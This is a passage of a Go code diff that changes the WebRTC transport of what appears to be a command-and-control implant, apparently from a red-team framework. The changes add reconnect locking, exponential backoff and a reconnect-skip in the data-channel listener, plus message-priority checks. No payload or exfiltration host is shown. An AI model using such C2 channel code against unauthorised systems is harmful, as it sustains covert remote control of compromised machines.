+	}
+
+	for _, highPriorityField := range []string{"responses", "delegates", "edges", "interactive", "alerts"} {
+		if _, ok := envelope[highPriorityField]; ok {
+			return false
+		}
+	}
+	return true
 }
 
 func (c *C2WebRTC) prepareMessage(sendData []byte) ([]byte, error) {
@@ -1047,14 +1478,68 @@ func (c *C2WebRTC) UpdateConfig(parameter string, value string) {
 	}
 }
 
+func (c *C2WebRTC) beginReconnect() bool {
+	c.reconnectLock.Lock()
+	defer c.reconnectLock.Unlock()
+
+	if c.reconnecting {
+		return false
+	}
+	c.reconnecting = true
+	return true
+}
+
+func (c *C2WebRTC) endReconnect() {
+	c.reconnectLock.Lock()
+	c.reconnecting = false
+	c.reconnectLock.Unlock()
+}
+
+func (c *C2WebRTC) isReconnecting() bool {
+	c.reconnectLock.Lock()
+	defer c.reconnectLock.Unlock()
+	return c.reconnecting
+}
+
+func (c *C2WebRTC) requestReconnect(reason string) {
+	if c.ShouldStop {
+		return
+	}
+	if c.isReconnecting() {
+		utils.PrintDebug(fmt.Sprintf("Skipping reconnect request while reconnecting: %s", reason))
+		return
+	}
+	utils.PrintDebug(reason)
+	go c.reconnect()
+}
+
+func (c *C2WebRTC) reconnectBackoff(attempt int) time.Duration {
+	backoff := webRTCDefaultReconnectInitialBackoff
+	maxBackoff := webRTCDefaultReconnectMaxBackoff
+	if backoff > maxBackoff {
+		return maxBackoff
+	}
+
+	for i := 0; i < attempt; i++ {
+		backoff *= 2
+		if backoff >= maxBackoff {
+			return maxBackoff
+		}
+	}
+	return backoff
+}
+
 func (c *C2WebRTC) reconnect() {
 	if c.ShouldStop {
 		utils.PrintDebug("Got shouldStop in reconnect")
 		return
 	}
 
-	c.reconnectLock.Lock()
-	defer c.reconnectLock.Unlock()
+	if !c.beginReconnect() {
+		utils.PrintDebug("Reconnect already in progress")
+		return
+	}
+	defer c.endReconnect()
 
 	c.closeConnections()
 
@@ -1064,20 +1549,20 @@ func (c *C2WebRTC) reconnect() {
 
 	utils.PrintDebug("Reconnecting to signaling server")
 
-	for i := 0; i < webRTCReconnectMaxRetries; i++ {
+	for i := 0; i < webRTCDefaultReconnectMaxRetries; i++ {
 		if c.ShouldStop {
 			return
 		}
 
 		if err := c.establishConnection(); err != nil {
 			utils.PrintDebug(fmt.Sprintf("Reconnection attempt %d failed: %v", i+1, err))
-			time.Sleep(time.Duration(2*(i+1)) * time.Second)
+			time.Sleep(c.reconnectBackoff(i))
 			continue
 		}
 
 		if err := c.waitForDataChannelReady(); err != nil {
 			utils.PrintDebug(fmt.Sprintf("Data channel setup failed on reconnect: %v", err))
-			time.Sleep(time.Duration(2*(i+1)) * time.Second)
+			time.Sleep(c.reconnectBackoff(i))
 			continue
 		}
 
@@ -1107,13 +1592,16 @@ func (c *C2WebRTC) startDataChannelListener() {
 	for !c.ShouldStop {
 		select {
 		case <-ticker.C:
+			if c.isReconnecting() {
+				continue
+			}
+
 			c.Lock.RLock()
 			dataChannel := c.DataChannel
 			c.Lock.RUnlock()
 
 			if dataChannel == nil || dataChannel.ReadyState() == webrtc.DataChannelStateClosed {
-				utils.PrintDebug("Data channel actually closed, reconnecting")
-				c.reconnect()
+				c.requestReconnect("Data channel actually closed, reconnecting")
 			}
 		}
 	}
